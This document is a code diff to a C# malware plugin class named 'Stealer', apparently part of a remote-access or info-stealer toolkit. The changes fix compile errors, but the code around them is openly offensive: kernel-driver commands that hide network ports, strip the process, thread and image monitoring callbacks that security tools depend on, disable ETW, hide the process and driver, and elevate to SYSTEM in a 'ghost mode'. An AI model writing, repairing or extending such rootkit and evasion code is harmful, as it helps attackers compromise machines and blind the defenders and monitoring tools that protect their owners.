@@ -198,8 +198,10 @@ public sealed class Stealer : IUniversalPlugin
     {
       string output;
       bool success;
+      string args = parameters as string;
       int pid = parameters != null ? Convert.ToInt32(parameters) : System.Diagnostics.Process.GetCurrentProcess().Id;
-
+      switch (command)
+      {
         case "kernel_hide_port":
           using (var dev = new KernelController())
           {
@@ -226,9 +228,12 @@ public sealed class Stealer : IUniversalPlugin
             {
               // Remove all common monitoring callbacks (Process, Thread, Image)
               // This is a simplified mass-removal for LO
-              bool p = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 0, Index = 0 });
-              bool t = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 1, Index = 0 });
-              bool i = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 2, Index = 0 });
+              var cbProc = new KernelController.TargetCallback { CallbackType = 0, Index = 0 };
+              bool p = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref cbProc);
+              var cbThread = new KernelController.TargetCallback { CallbackType = 1, Index = 0 };
+              bool t = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref cbThread);
+              var cbImage = new KernelController.TargetCallback { CallbackType = 2, Index = 0 };
+              bool i = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref cbImage);
               output = $"Callback Cleanup - Process: {p}, Thread: {t}, Image: {i}";
               success = p || t || i;
             }
@@ -455,8 +460,8 @@ public sealed class Stealer : IUniversalPlugin
           {
             if (shadow.Connect())
             {
-              int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
-              success = shadow.ActivateFullStealth(pid);
+              int shadowPid = System.Diagnostics.Process.GetCurrentProcess().Id;
+              success = shadow.ActivateFullStealth(shadowPid);
               output = success ? "🔥 FULL STEALTH ACTIVATED! Process hidden, driver hidden, ETW disabled." 
                                : "Partial stealth - some operations may have failed.";
             }
@@ -470,8 +475,8 @@ public sealed class Stealer : IUniversalPlugin
           {
             if (shadow.Connect())
             {
-              int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
-              success = shadow.BecomeGhost(pid);
+              int shadowPid = System.Diagnostics.Process.GetCurrentProcess().Id;
+              success = shadow.BecomeGhost(shadowPid);
               output = success ? "👻 GHOST MODE! Elevated to SYSTEM and hidden from all tools."
                                : "Ghost mode partial - check kernel driver status.";
             }
